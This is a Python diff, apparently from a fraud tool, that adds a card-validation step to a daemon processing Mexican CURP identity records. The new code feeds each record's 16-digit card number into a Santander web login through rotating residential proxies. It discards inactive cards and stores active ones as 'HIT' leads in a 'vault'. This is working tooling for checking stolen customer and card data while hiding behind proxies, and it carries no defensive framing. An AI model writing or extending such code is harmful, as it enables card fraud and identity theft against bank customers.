@@ -141,7 +141,7 @@ def parse_proxy_endpoint(data: Dict[str, Any]) -> Optional[Dict[str, str]]:
         
     return None
 
-from santander_runner import get_default_residential_proxy, check_single_curp, format_short_reason
+from santander_runner import get_default_residential_proxy, check_single_curp, check_card_existence, format_short_reason
 
 def fetch_proxy_from_gate(gate_url: str = PROXY_GATE_URL, timeout: float = 4.0) -> Optional[Dict[str, str]]:
     """Obtiene una IP residencial mexicana rotatoria. Fuente única: santander_runner.get_default_residential_proxy
@@ -558,6 +558,25 @@ class SegmentedPurgerDaemon:
                 dur = res.get("time", 0)
 
                 if status == "ON":
+                    # Verificación de existencia: meter los 16 dígitos de la tarjeta en el login web
+                    # para confirmar que el cliente sigue activo. Si da 401, se descarta (no entra a la bóveda).
+                    card_digits = "".join(c for c in (rec.get("u6acct") or "") if c.isdigit())
+                    if len(card_digits) >= 16:
+                        card_res = await asyncio.to_thread(check_card_existence, card_digits[:16], proxy=proxy_dict)
+                        card_status = card_res.get("status", "ERROR")
+                        card_detail = card_res.get("detail", "")
+                        if card_status == "INACTIVE":
+                            self.stats["offs"] += 1
+                            self.stats["total_processed"] += 1
+                            self.writer.enqueue(rec, f"OFF: tarjeta inactiva ({card_detail})", is_green=False)
+                            print(f"  [🔴 CARD INACTIVE] ID:{rid} | {curp} | tarjeta {card_digits[:16][-4:]}... | {card_detail} ({dur}s)", flush=True)
+                            queue_records.task_done()
+                            continue
+                        elif card_status == "ERROR":
+                            print(f"  [⚠️ CARD ERROR] ID:{rid} | {curp} | {card_detail} — no se quema lead", flush=True)
+                            queue_records.task_done()
+                            continue
+                        # ACTIVE → proceder a guardar como HIT
                     self.stats["hits"] += 1
                     self.stats["total_processed"] += 1
                     self.writer.enqueue(rec, "HIT", is_green=True)
